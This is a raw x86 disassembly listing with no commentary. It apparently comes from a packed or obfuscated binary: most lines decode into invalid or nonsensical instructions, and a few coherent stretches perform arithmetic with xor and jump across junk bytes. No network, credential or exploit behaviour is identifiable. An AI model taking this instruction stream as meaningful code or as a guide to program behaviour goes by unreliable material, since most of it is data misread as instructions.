  40c7bb:	add    esi,DWORD PTR ds:0x53652861
  40c7c1:	adc    edi,ebx
  40c7c3:	inc    edx
  40c7c4:	cmp    edx,DWORD PTR [edi]
  40c7c6:	sbb    al,ch
  40c7c8:	(bad)  
  40c7c9:	pop    ss
  40c7ca:	lds    esi,FWORD PTR [esi]
  40c7cc:	fisttp DWORD PTR [ecx-0x3d]
  40c7cf:	retf   0x2e53
  40c7d2:	leave  
  40c7d3:	repnz loopne 0x40c7ab
  40c7d6:	sub    al,0x25
  40c7d8:	lea    ebp,[edi+ebp*4+0x2ce7cfec]
  40c7df:	adc    eax,0x5d01a418
  40c7e4:	retf   
  40c7e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7e6:	pop    ebp
  40c7e7:	xchg   esi,eax
  40c7e8:	aad    0x37
  40c7ea:	mov    ds:0xb699e365,eax
  40c7ef:	jnp    0x40c7af
  40c7f1:	push   esp
  40c7f2:	fidiv  DWORD PTR [ecx+edx*4]
  40c7f5:	pop    ebx
  40c7f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7f7:	jno    0x40c847
  40c7f9:	sub    ebp,eax
  40c7fb:	scas   al,BYTE PTR es:[edi]
  40c7fc:	aam    0x3c
  40c7fe:	fs jecxz 0x40c78a
  40c801:	xor    ebp,DWORD PTR [eax]
  40c803:	mov    bh,0x7f
  40c805:	sbb    DWORD PTR [edx+0x3ba396ff],ecx
  40c80b:	jae    0x40c792
  40c80d:	sti    
  40c80e:	in     al,0xd0
  40c810:	adc    eax,0x8dd28067
  40c815:	scas   al,BYTE PTR es:[edi]
  40c816:	pushf  
  40c817:	ror    DWORD PTR [edx+0x4cfb248a],0x16
  40c81e:	xchg   DWORD PTR [esi],esi
  40c820:	push   esp
  40c821:	(bad)  
  40c822:	mov    bl,0x36
  40c824:	out    0x5b,al
  40c826:	iret   
  40c827:	dec    edx
  40c828:	xor    edi,eax
  40c82a:	daa    
  40c82b:	aaa    
  40c82c:	nop
  40c82d:	sti    
  40c82e:	mov    edi,0x95d4a178
  40c833:	jecxz  0x40c7ec
  40c835:	mov    WORD PTR [ecx+0x3ab1cec8],fs
  40c83b:	std    
  40c83c:	outs   dx,BYTE PTR ds:[esi]
  40c83d:	data16 (bad) 
  40c840:	xor    BYTE PTR [ebx+0x5d3acedc],0x11
  40c847:	enter  0x3c25,0xbd
  40c84b:	jne    0x40c83f
  40c84d:	fistp  DWORD PTR [edx]
  40c84f:	or     DWORD PTR ds:0x71ee5f20,ebp
  40c855:	push   ebx
  40c856:	jecxz  0x40c805
  40c858:	pop    esi
  40c859:	cld    
  40c85a:	fs xchg ebx,eax
  40c85c:	push   ss
  40c85d:	repz inc ecx
  40c85f:	pop    ebp
  40c860:	xchg   ebp,eax
  40c861:	repnz xchg esp,eax
  40c863:	jmp    0x40c88b
  40c865:	sahf   
  40c866:	mov    edi,0x81febe40
  40c86b:	dec    ebp
  40c86c:	jecxz  0x40c8eb
  40c86e:	stos   DWORD PTR es:[edi],eax
  40c86f:	nop
  40c870:	aad    0x4d
  40c872:	xor    BYTE PTR [ecx],bh
  40c874:	cmp    DWORD PTR [ebp-0x2d],0xfffffff0
  40c878:	jmp    0x40c8aa
  40c87a:	or     al,0x4f
  40c87c:	jno    0x40c820
  40c87e:	xchg   BYTE PTR [edx-0x139aca9c],bl
  40c884:	hlt    
  40c885:	mov    cl,0x3
  40c887:	mov    bl,0x5c
  40c889:	(bad)  
  40c88a:	adc    DWORD PTR [edi-0x56483e0a],ebp
  40c890:	mov    eax,0xd8b83397
  40c895:	mov    dl,0xd
  40c897:	jecxz  0x40c83d
  40c899:	and    eax,0x695ffedf
  40c89e:	xlat   BYTE PTR ds:[ebx]
  40c89f:	ins    BYTE PTR es:[edi],dx
  40c8a0:	imul   ecx,DWORD PTR [ebx-0x464971ba],0xffffff9d
  40c8a7:	pop    ecx
  40c8a8:	push   0xffffffed
  40c8aa:	fiadd  WORD PTR [ebx-0x2a87f205]
  40c8b0:	popf   
  40c8b1:	or     al,0x9c
  40c8b3:	dec    esi
  40c8b4:	stc    
  40c8b5:	repnz sbb BYTE PTR [edi+0x32f3a7de],bh
  40c8bc:	pop    ds
  40c8bd:	push   ds
  40c8be:	inc    ebp
  40c8bf:	sbb    ecx,eax
  40c8c1:	or     eax,0x1335c738
  40c8c6:	out    dx,al
  40c8c7:	(bad)  
  40c8c8:	xor    BYTE PTR [esi+eiz*8],dl
  40c8cb:	xor    ebx,DWORD PTR [edi+ebp*4]
  40c8ce:	jne    0x40c948
  40c8d0:	jmp    0x9bf44ff6
  40c8d5:	xchg   ebp,eax
  40c8d7:	aad    0x12
  40c8d9:	mov    esp,0x55b8a302
  40c8de:	pop    esp
  40c8df:	icebp  
  40c8e0:	and    DWORD PTR [ebx-0x28e6eef1],esp
  40c8e6:	dec    edx
  40c8e7:	lods   al,BYTE PTR ds:[esi]
  40c8e8:	adc    DWORD PTR ds:0x8b52a326,edx
  40c8ee:	jge    0x40c8d8
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	test   BYTE PTR [ebp-0x6b130c37],0x70
  40c91f:	jo     0x40c8c0
  40c921:	jge    0x40c993
  40c923:	jo     0x40c911
  40c925:	out    dx,eax
  40c926:	xchg   BYTE PTR [edi-0x5e],ah
  40c929:	pop    ss
  40c92a:	jnp    0x40c921
  40c92c:	inc    ebp
  40c92d:	adc    dl,BYTE PTR [esi+0x5093784c]
  40c933:	sbb    eax,0xc82ffa6f
  40c938:	repz xchg ebx,eax
  40c93a:	cld    
  40c93b:	push   0xbbecdb75
  40c940:	rcl    DWORD PTR [esi-0x4],1
  40c943:	sar    DWORD PTR [ecx-0x4b],0x6
  40c947:	sbb    al,0x4
  40c949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c94a:	ror    DWORD PTR [esi+edi*8-0xe],0x1e
  40c94f:	arpl   WORD PTR [ecx],bx
  40c951:	jecxz  0x40c9aa
  40c953:	pop    ecx
  40c954:	jno    0x40c93e
  40c956:	dec    ebx
  40c957:	cli    
  40c958:	repz sti 
  40c95a:	out    0x76,al
  40c95c:	sub    DWORD PTR [esi+eiz*8],ebx
  40c95f:	iret   
  40c960:	sahf   
  40c961:	js     0x40c932
  40c963:	outs   dx,DWORD PTR ds:[esi]
  40c964:	mov    al,0x7a
  40c966:	inc    eax
  40c967:	cld    
  40c968:	sub    BYTE PTR [ecx+0x2c],dl
  40c96b:	iret   
  40c96c:	inc    ebx
  40c96d:	add    eax,0x4848607c
  40c972:	push   0xffffffc8
  40c974:	pop    ebp
  40c975:	inc    ebx
  40c976:	xchg   ecx,eax
  40c977:	(bad)  
  40c978:	(bad)  
  40c979:	hlt    
  40c97a:	in     eax,0xba
  40c97c:	aas    
  40c97d:	fmul   DWORD PTR [esi-0x5a]
  40c980:	mov    fs,WORD PTR [ebx+edx*2+0x267bb049]
  40c987:	adc    ecx,ebp
  40c989:	xlat   BYTE PTR ds:[ebx]
  40c98a:	hlt    
  40c98b:	je     0x40c997
  40c98d:	and    eax,0x8f33c3d9
  40c992:	dec    eax
  40c993:	ja     0x40c9ac
  40c995:	dec    esi
  40c996:	xchg   ecx,eax
  40c997:	sbb    eax,0x77c8d6e
  40c99c:	shl    DWORD PTR [ecx-0x3c55bc28],cl
  40c9a2:	mov    esi,0xf0b35095
  40c9a7:	in     al,dx
  40c9a8:	adc    ebp,ebp
  40c9aa:	push   esp
  40c9ab:	xor    esp,ebx
  40c9ad:	aam    0x5a
  40c9af:	pop    ecx
  40c9b0:	les    esp,FWORD PTR [ecx-0x2c2db18e]
  40c9b6:	ins    DWORD PTR es:[edi],dx
  40c9b7:	dec    ebp
  40c9b8:	mov    WORD PTR [eax+0x6f],?
  40c9bb:	inc    esp
  40c9bc:	shl    DWORD PTR [edi-0x2898463f],1
  40c9c2:	push   edx
  40c9c3:	and    ax,0xfd40
  40c9c7:	jmp    0x38c0fff6
  40c9cc:	or     BYTE PTR [edx],bh
  40c9ce:	dec    ebx
  40c9cf:	add    al,0xeb
  40c9d1:	cmp    DWORD PTR [esi+edi*8-0x64],eax
  40c9d5:	sbb    ebp,DWORD PTR [edi-0x72563a4c]
  40c9db:	sub    al,cl
  40c9dd:	and    bh,BYTE PTR [ecx+0x66]
  40c9e0:	and    ah,BYTE PTR [edx-0x46]
  40c9e3:	cmp    ch,0x5d
  40c9e6:	push   cs
  40c9e7:	sbb    DWORD PTR [ecx+0x11b5ebfe],eax
  40c9ed:	xchg   esp,eax
  40c9ee:	mov    ecx,0xf0755bb3
  40c9f3:	pushf  
  40c9f4:	lods   eax,DWORD PTR ds:[esi]
  40c9f5:	or     eax,0x5045b594
  40c9fa:	ror    BYTE PTR [ecx+esi*8],0xfc
  40c9fe:	cmc    
  40c9ff:	dec    ecx
  40ca00:	sbb    al,0x7c
  40ca02:	jb     0x40c9bc
  40ca04:	ror    DWORD PTR [edi+ebp*8+0x1a97d62b],1
  40ca0b:	dec    esi
  40ca0c:	mov    dh,0x43
  40ca0e:	pusha  
  40ca0f:	push   0xffffffba
  40ca11:	sbb    edx,esi
  40ca13:	lahf   
  40ca14:	mov    ecx,0xadd66ad2
  40ca19:	sub    ebx,DWORD PTR [edx]
  40ca1b:	iret   
  40ca1c:	jb     0x40ca11
  40ca1e:	(bad)  
  40ca1f:	out    0x3f,al
  40ca21:	xor    BYTE PTR [ebp+0x74],ah
  40ca24:	aaa    
  40ca25:	xchg   ebp,eax
  40ca26:	jp     0x40c9cb
  40ca28:	ret    0x35a9
  40ca2b:	push   ds
  40ca2c:	int3   
  40ca2d:	test   bh,dh
  40ca2f:	scas   al,BYTE PTR es:[edi]
  40ca30:	jne    0x40ca1e
  40ca32:	test   eax,0x7a6ada8f
  40ca37:	mov    ds:0x1af6ff63,eax
  40ca3c:	adc    cl,bl
  40ca3e:	add    DWORD PTR [edx-0x5a],ebp
  40ca41:	js     0x40c9cc
  40ca43:	sbb    ecx,ecx
  40ca45:	arpl   WORD PTR ss:[eax+0x37],ax
  40ca49:	sbb    ecx,DWORD PTR [ecx]
  40ca4b:	test   DWORD PTR [edi],eax
  40ca4d:	test   DWORD PTR [ebp+0x43a51090],edi
  40ca53:	or     BYTE PTR [edx],0x79
  40ca56:	std    
  40ca57:	sahf   
  40ca58:	clc    
  40ca59:	aaa    
  40ca5a:	mov    esi,0x65046cf
  40ca5f:	jae    0x40ca95
  40ca61:	mov    edi,0x7291c92e
  40ca66:	inc    ebx
  40ca67:	xchg   esp,eax
  40ca68:	ror    BYTE PTR [edi-0x80],1
  40ca6b:	inc    ecx
  40ca6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca6d:	out    0x68,eax
  40ca6f:	das    
  40ca70:	and    edx,0xffffffc8
  40ca73:	popa   
  40ca74:	dec    ecx
  40ca75:	dec    edi
  40ca76:	das    
  40ca77:	inc    ebx
  40ca78:	mov    ebx,0x9c6ee062
  40ca7d:	(bad)  [edi+0x0]
  40ca80:	cli    
  40ca81:	shr    dl,1
  40ca83:	loope  0x40ca16
  40ca85:	pop    edi
  40ca86:	addr16 ret 
  40ca88:	dec    esp
  40ca89:	inc    edi
  40ca8a:	push   ebx
  40ca8b:	adc    BYTE PTR [edx],bl
  40ca8d:	and    ebp,esi
  40ca8f:	dec    edi
  40ca90:	inc    esi
  40ca91:	int3   
  40ca92:	das    
  40ca93:	test   BYTE PTR [ebx],bh
  40ca95:	out    dx,eax
  40ca96:	jg     0x40ca84
  40ca98:	ret    0x3e47
  40ca9b:	or     ah,0x43
  40ca9e:	cmp    al,0xe9
  40caa0:	cmc    
  40caa1:	ficom  DWORD PTR ds:0xb3fed68d
  40caa7:	nop
  40caa8:	xlat   BYTE PTR ds:[ebx]
  40caa9:	sti    
  40caaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caab:	push   0x522cc652
  40cab0:	pop    ebp
  40cab1:	test   BYTE PTR [esi-0x4c],dh
  40cab4:	xchg   edi,eax
  40cab5:	sub    BYTE PTR [ebx-0x3d],bl
  40cab8:	pop    ecx
  40cab9:	mov    dl,0xeb
  40cabb:	aas    
  40cabc:	mov    ch,0xba
  40cabe:	je     0x40ca8c
  40cac0:	lods   eax,DWORD PTR ds:[esi]
  40cac1:	out    0x64,eax
  40cac3:	or     edi,edi
  40cac5:	leave  
  40cac6:	pop    es
  40cac7:	ins    BYTE PTR es:[edi],dx
  40cac8:	inc    eax
  40cac9:	push   0x59
  40cacb:	xor    al,0x85
  40cacd:	sub    eax,edi
  40cacf:	push   es
  40cad0:	rol    DWORD PTR [eax*8+0x6a48c2a],1
  40cad7:	or     eax,esp
  40cad9:	lods   al,BYTE PTR ds:[esi]
  40cada:	ret    0xfe6d
  40cadd:	dec    ebp
  40cade:	out    dx,al
  40cadf:	jns    0x40cb50
  40cae1:	and    edi,DWORD PTR [eax-0x29598df2]
  40cae7:	sub    DWORD PTR [edi],0xb2d6556c
  40caed:	add    ah,ah
  40caef:	jno    0x40cb5c
  40caf1:	push   esi
  40caf2:	iret   
  40caf3:	mov    edi,DWORD PTR [eax-0x5a55d56]
  40caf9:	push   edx
  40cafa:	scas   al,BYTE PTR es:[edi]
  40cafb:	aad    0x9b
  40cafd:	js     0x40cb5b
  40caff:	or     al,0x74
  40cb01:	add    ebp,ecx
  40cb03:	inc    ebx
  40cb04:	pop    ds
  40cb05:	xor    al,0x8d
  40cb07:	into   
  40cb08:	mov    bh,0x5b
  40cb0a:	pushf  
  40cb0b:	lahf   
  40cb0c:	pop    es
  40cb0d:	loope  0x40cb20
  40cb0f:	push   cs
  40cb10:	clc    
  40cb11:	les    esp,FWORD PTR [ebp+ebp*8+0x0]
  40cb15:	int3   
  40cb16:	int    0x6d
  40cb18:	xchg   ebx,eax
  40cb19:	or     eax,esi
  40cb1b:	mov    ch,0xda
  40cb1d:	mov    dh,0xc4
  40cb1f:	sub    bl,0xb5
  40cb22:	push   ds
  40cb23:	sub    BYTE PTR [ebx+esi*1],0xea
  40cb27:	fs mov dh,cl
  40cb2a:	jns    0x40cb16
  40cb2c:	aad    0x21
  40cb2e:	mov    ah,0xaf
  40cb30:	addr16 mov ds:0x675,al
  40cb34:	mov    WORD PTR [ebx],es
  40cb36:	je     0x40cab9
  40cb38:	and    BYTE PTR [esi-0x131251f3],ch
  40cb3e:	xchg   DWORD PTR [ebx+0x6f],eax
  40cb41:	add    BYTE PTR [eax-0x64],bl
  40cb44:	inc    edx
  40cb45:	repz pop edx
  40cb47:	ret    0xc0eb
  40cb4a:	push   ss
  40cb4b:	xchg   esi,eax
  40cb4c:	push   edx
  40cb4d:	in     eax,0x1e
  40cb4f:	mov    WORD PTR [ecx-0x471ae074],es
  40cb55:	and    bh,dh
  40cb57:	mov    bh,0x16
  40cb59:	cmp    edi,DWORD PTR [edx+0x38]
  40cb5c:	retf   
  40cb5d:	out    dx,al
  40cb5e:	(bad)  
  40cb5f:	out    0x5d,al
  40cb61:	and    BYTE PTR [ecx],bl
  40cb63:	xor    DWORD PTR ds:0x4f31f1fa,ecx
  40cb69:	cli    
  40cb6a:	ja     0x40cb39
  40cb6c:	mov    ds:0x968c1d5c,eax
  40cb71:	(bad)  
  40cb72:	jmp    0x40cb3f
  40cb74:	es dec esi
  40cb76:	sbb    ah,al
  40cb78:	dec    ecx
  40cb79:	aad    0x31
  40cb7b:	add    dh,BYTE PTR [ecx-0x62e32e1]
  40cb81:	add    al,0x25
  40cb83:	stos   BYTE PTR es:[edi],al
  40cb84:	push   esp
  40cb85:	cmp    esi,DWORD PTR [edi-0x67]
  40cb88:	enter  0xcc90,0x4d
  40cb8c:	cld    
  40cb8d:	or     ebp,DWORD PTR [ebp+0x28e5ee86]
  40cb93:	sbb    BYTE PTR [esp+ebp*1-0x7],bh
  40cb97:	bnd jno 0x40cb1d
  40cb9a:	std    
  40cb9b:	dec    eax
  40cb9c:	es call 0x4598:0xf9dd0768
  40cba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cba5:	js     0x40cbd9
  40cba7:	int    0x69
  40cba9:	std    
  40cbaa:	ja     0x40cc0f
  40cbac:	es mov bh,0x1f
  40cbaf:	jbe    0x40cc10
  40cbb1:	mov    esp,0x58ab1fa0
  40cbb6:	(bad)  
  40cbb7:	call   0x6d0fb31d
  40cbbc:	stc    
  40cbbd:	lods   eax,DWORD PTR ds:[esi]
  40cbbe:	jecxz  0x40cbc6
  40cbc0:	data16 rcr BYTE PTR [edi],cl
  40cbc3:	ret    0x10e
  40cbc6:	push   ss
  40cbc7:	and    esp,esi
  40cbc9:	add    al,0xf5
  40cbcb:	jmp    0x614d8bba
  40cbd0:	or     bl,BYTE PTR [edx+0x5f4a4610]
  40cbd6:	loop   0x40cc3c
  40cbd8:	xchg   esi,eax
  40cbd9:	pop    esp
  40cbda:	mov    eax,ds:0x98c176dc
  40cbdf:	push   cs
  40cbe0:	addr16 jl 0x40cc08
  40cbe3:	lahf   
  40cbe4:	inc    edx
  40cbe5:	ins    BYTE PTR es:[edi],dx
  40cbe6:	lock (bad) 
  40cbe8:	(bad)  
  40cbe9:	ja     0x40cb9b
  40cbeb:	imul   esp,DWORD PTR [eax+esi*8-0x4f],0xf637998b
  40cbf3:	adc    al,0xa
  40cbf5:	mov    bh,0x91
  40cbf7:	push   gs
  40cbf9:	jl     0x40cc13
  40cbfb:	(bad)  
  40cbfc:	dec    dl
  40cbfe:	fsub   DWORD PTR [ebp+0x7f01141a]
  40cc04:	mov    ah,BYTE PTR [esi+0x86840cb]
  40cc0a:	fdiv   QWORD PTR [eax+0x6e89c921]
  40cc10:	add    al,0xe1
  40cc12:	mov    ah,0xb9
  40cc14:	test   al,0x41
  40cc16:	push   es
  40cc17:	test   edi,0x74176009
  40cc1d:	(bad)  
  40cc1f:	xchg   edx,eax
  40cc20:	neg    ecx
  40cc22:	inc    ebp
  40cc23:	(bad)  
  40cc24:	adc    eax,0xe6e4b116
  40cc29:	push   0x75
  40cc2b:	push   edx
  40cc2c:	add    eax,0xf587b9d6
  40cc31:	jbe    0x40cbf6
  40cc33:	outs   dx,DWORD PTR ds:[esi]
  40cc34:	mov    al,ds:0x8fadb9bd
  40cc39:	push   edx
  40cc3a:	sbb    al,0xf3
  40cc3c:	pop    ebx
  40cc3d:	rol    ebp,0x2a
  40cc40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc41:	cdq    
  40cc42:	push   ebp
  40cc43:	add    BYTE PTR [edx-0x1d3ee9e0],dh
  40cc49:	cmp    DWORD PTR [ecx+edx*8+0x5c],edx
  40cc4d:	cmp    DWORD PTR [eax+0x6c3150b7],eax
  40cc53:	and    eax,0xf9756f91
  40cc58:	ror    DWORD PTR [edi+0x7ccb55ee],0x7a
  40cc5f:	mov    dh,0xff
  40cc61:	add    DWORD PTR [ebx-0x21e1c528],0xffffff8d
  40cc68:	out    0x8c,al
  40cc6a:	sub    edx,edi
  40cc6c:	pusha  
  40cc6d:	in     eax,dx
  40cc6e:	ds and al,0xbb
  40cc71:	aaa    
  40cc72:	pop    ss
  40cc73:	adc    DWORD PTR ds:[edx+0x3f],ebx
  40cc77:	fst    QWORD PTR [ebp+0x1b9c57cd]
  40cc7d:	and    al,BYTE PTR [eax]
  40cc7f:	xor    DWORD PTR [ecx],edx
  40cc81:	cmp    DWORD PTR [esi-0x41],esi
  40cc84:	call   0x8a0a98ce
  40cc89:	jl     0x40cca5
  40cc8b:	dec    ecx
  40cc8c:	(bad)  
  40cc8d:	(bad)  
  40cc8e:	dec    edx
  40cc8f:	and    al,0x76
  40cc91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc92:	adc    eax,0xa1e6dc79
  40cc97:	adc    eax,0x8835fafd
  40cc9c:	xchg   ebp,eax
  40cc9d:	and    edi,esp
  40cc9f:	push   0x571e7962
  40cca4:	and    al,0x8d
  40cca6:	cdq    
  40cca7:	sub    BYTE PTR [ebp+0x207d5d73],0x3f
  40ccae:	jb     0x40cc3f
  40ccb0:	into   
  40ccb1:	repnz jecxz 0x40cd2b
  40ccb4:	push   esi
  40ccb5:	ja     0x40cce1
  40ccb7:	fcomi  st,st(5)
  40ccb9:	lods   eax,DWORD PTR ds:[esi]
  40ccba:	mov    ebx,0x860694b9
  40ccbf:	std    
  40ccc0:	stos   BYTE PTR es:[edi],al
  40ccc1:	ret    
  40ccc2:	daa    
  40ccc3:	dec    edi
  40ccc4:	out    0x33,eax
  40ccc6:	clc    
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	or     DWORD PTR [ecx+eax*8-0x6ff4b1f3],0x70
  40cd1d:	jo     0x40ccbe
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cced
  40cd23:	push   esi
  40cd24:	sbb    esp,eax
  40cd26:	cmp    DWORD PTR [edi],ebx
  40cd28:	and    ecx,DWORD PTR ds:0x423d4609
  40cd2e:	mov    WORD PTR [eax+eiz*2],fs
  40cd31:	sbb    eax,0xcf97e243
  40cd36:	ss das 
  40cd38:	popf   
  40cd39:	ret    0xbdba
  40cd3c:	and    DWORD PTR [edi+0x2035a2d7],0x13936afd
  40cd46:	push   es
  40cd47:	or     edx,ecx
  40cd49:	(bad)  
  40cd4a:	fucomip st,st(5)
  40cd4c:	cdq    
  40cd4d:	pop    es
  40cd4e:	sub    al,0xca
  40cd50:	mov    ecx,0x9eda2a03
  40cd55:	jno    0x40ccd9
  40cd57:	or     eax,0x27250ac5
  40cd5c:	sub    bl,0x94
  40cd5f:	call   0x1897:0x3b95b64e
  40cd66:	inc    ecx
  40cd67:	sub    al,0x97
  40cd69:	dec    edi
  40cd6a:	mov    edx,0xa862f062
  40cd6f:	scas   al,BYTE PTR es:[edi]
  40cd70:	lahf   
  40cd71:	test   cl,al
  40cd73:	and    bl,bl
  40cd75:	mov    ch,BYTE PTR [ebx]
  40cd77:	sub    eax,0xead90fe3
  40cd7c:	dec    esp
  40cd7d:	aas    
  40cd7e:	fcom   DWORD PTR [eax]
  40cd80:	xor    al,0x7e
  40cd82:	enter  0xc8b5,0x5f
  40cd86:	or     ecx,DWORD PTR [esi-0xfd39379]
  40cd8c:	mov    cl,0xee
  40cd8e:	inc    edi
  40cd8f:	lock bound ecx,QWORD PTR [esi]
  40cd92:	mov    bl,0x6f
  40cd95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd96:	push   esi
  40cd97:	cdq    
  40cd98:	sahf   
  40cd99:	push   ebp
  40cd9a:	xchg   esp,eax
  40cd9b:	(bad)  
  40cd9c:	cmp    bh,cl
  40cd9e:	push   0xa0f2a9cc
  40cda3:	pop    edx
  40cda4:	xchg   edi,eax
  40cda5:	sub    ebp,eax
  40cda7:	inc    ecx
  40cda8:	adc    DWORD PTR [esi+0x7e604165],eax
  40cdae:	sbb    al,0x4e
  40cdb0:	in     eax,0xb
  40cdb2:	sub    al,0xe1
  40cdb4:	or     eax,0x44c21f3e
  40cdb9:	push   esi
  40cdba:	ret    0x6c0c
  40cdbd:	lea    edx,[edi+0x2a4f1c19]
  40cdc3:	fadd   DWORD PTR [esi]
  40cdc5:	jmp    0x9503:0x19c5a01f
  40cdcc:	push   eax
  40cdcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdce:	and    ebp,DWORD PTR [ecx+0x70eb9f8e]
  40cdd4:	mov    ebx,0x8891c179
  40cdd9:	xor    al,0x91
  40cddb:	jne    0x40cdcc
  40cddd:	fs stos BYTE PTR es:[edi],al
  40cddf:	(bad)  
  40cde1:	call   0x1ac095b9
  40cde6:	sub    DWORD PTR [edx-0xb],0x16874f38
  40cded:	dec    ebp
  40cdee:	(bad)  
  40cdef:	popf   
  40cdf0:	repnz loope 0x40cdca
  40cdf3:	dec    esp
  40cdf4:	push   ecx
  40cdf5:	fs pop edi
  40cdf7:	in     eax,dx
  40cdf8:	repz popf 
  40cdfa:	ds inc ebp
  40cdfc:	(bad)  [esp+esi*1+0x1f]
  40ce00:	adc    ah,BYTE PTR [esi]
  40ce02:	jg     0x40cda7
  40ce04:	lds    ebx,FWORD PTR [edi+0xd85cd87]
  40ce0a:	cmp    eax,0x2d7962bf
  40ce0f:	push   cs
  40ce10:	or     BYTE PTR [edx+0xf57a842],0x63
  40ce17:	adc    BYTE PTR [ebp-0x35],dl
  40ce1a:	or     BYTE PTR [edi-0x62159332],0x94
  40ce21:	push   0x8b23203d
  40ce26:	iret   
  40ce27:	int    0xcf
  40ce29:	or     eax,0x147114cf
  40ce2e:	dec    ebx
  40ce2f:	scas   eax,DWORD PTR es:[edi]
  40ce30:	and    esp,DWORD PTR [ecx]
  40ce32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce33:	cmp    eax,0xb0a0b11
  40ce38:	in     eax,0x63
  40ce3a:	ret    0xdfc8
  40ce3d:	or     al,0x3
  40ce3f:	jg     0x40ce1d
  40ce41:	iret   
  40ce42:	ror    cl,1
  40ce44:	sti    
  40ce45:	xor    BYTE PTR [ecx+0x1cae890f],dl
  40ce4b:	cdq    
  40ce4c:	sub    eax,0x5aa6d33e
  40ce51:	push   es
  40ce52:	pop    edi
  40ce53:	(bad)
  40ce56:	jge    0x40cece
  40ce58:	retf   0xaf59
  40ce5b:	call   0x551b7eba
  40ce60:	outs   dx,DWORD PTR ds:[esi]
  40ce61:	add    edx,DWORD PTR [ebx+0x43]
  40ce64:	mov    al,ds:0x10ab7eb
  40ce69:	xor    BYTE PTR [edi],ch
  40ce6b:	enter  0x2d91,0x10
  40ce6f:	aad    0x49
  40ce71:	pop    edi
  40ce72:	pushw  ds
  40ce74:	sub    edx,esp
  40ce76:	mov    ah,0x61
  40ce78:	pop    es
  40ce79:	add    eax,0xc1e6e2b6
  40ce7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce7f:	ins    DWORD PTR es:[edi],dx
  40ce80:	adc    DWORD PTR [edi-0x7f],esp
  40ce83:	sar    DWORD PTR [ebx+ebp*8],1
  40ce86:	xchg   esi,eax
  40ce87:	retf   
  40ce88:	jge    0x40ce89
  40ce8a:	and    eax,0xfbf331a1
  40ce8f:	mov    ah,0x8
  40ce91:	mov    bh,0xd1
  40ce93:	xor    cl,BYTE PTR [esi-0x2]
  40ce96:	pop    edx
  40ce97:	inc    edi
  40ce98:	mov    ebx,DWORD PTR [ecx]
  40ce9a:	outs   dx,BYTE PTR ds:[esi]
  40ce9b:	daa    
  40ce9c:	dec    edx
  40ce9d:	lds    edx,FWORD PTR [ebx]
  40ce9f:	imul   esp,DWORD PTR [ebx+0x3198d024],0xf0bb6d02
  40cea9:	loope  0x40ce53
  40ceab:	push   esi
  40ceac:	lahf   
  40cead:	pop    ebx
  40ceae:	adc    ebp,DWORD PTR [ecx+0x5a212c3a]
  40ceb4:	adc    esi,DWORD PTR [eax+0x4f4e1c31]
  40ceba:	xchg   dl,cl
  40cebc:	shl    DWORD PTR [ebp+0x4],1
  40cebf:	cmp    DWORD PTR [edx-0x1b],0x3b
  40cec3:	sub    eax,0xbe13177c
  40cec8:	jl     0x40ceb2
  40ceca:	outs   dx,BYTE PTR ds:[esi]
  40cecb:	or     al,0x9b
  40cecd:	add    al,0x7c
  40cecf:	retf   0x8fa1
  40ced2:	out    0x51,al
  40ced4:	sub    bl,BYTE PTR [ebp-0x628991d3]
  40ceda:	push   edx
  40cedb:	loopne 0x40ce9b
  40cedd:	popf   
  40cede:	adc    ebx,DWORD PTR [eax+0x18168b81]
  40cee4:	mov    eax,0x160805fa
  40cee9:	push   cs
  40ceea:	aam    0xdd
  40ceec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceed:	fcmovne st,st(7)
  40ceef:	call   0xd5e17d89
  40cef4:	(bad)  
  40cef5:	xor    BYTE PTR [esi-0x4986c7c0],bh
  40cefb:	stc    
  40cefc:	or     al,0xc1
  40cefe:	cli    
  40ceff:	sub    bh,al
